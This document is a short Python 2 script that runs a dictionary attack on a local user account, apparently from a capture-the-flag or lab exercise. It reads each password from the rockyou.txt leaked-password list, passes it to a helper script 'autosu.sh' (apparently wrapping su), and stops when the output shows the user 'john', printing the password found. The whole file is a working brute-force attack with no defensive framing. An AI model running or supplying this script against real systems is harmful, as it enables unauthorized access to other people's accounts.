#! /usr/bin/python
import subprocess
count = 1
with open("rockyou.txt", "r") as ins:
  for line in ins:
    print "Trying Password "+str(count)+":  "+str(line)
    if "john" in subprocess.check_output(['./autosu.sh',str(line)]):
      print "Password: "+str(line)
      exit(0)
    count = count + 1
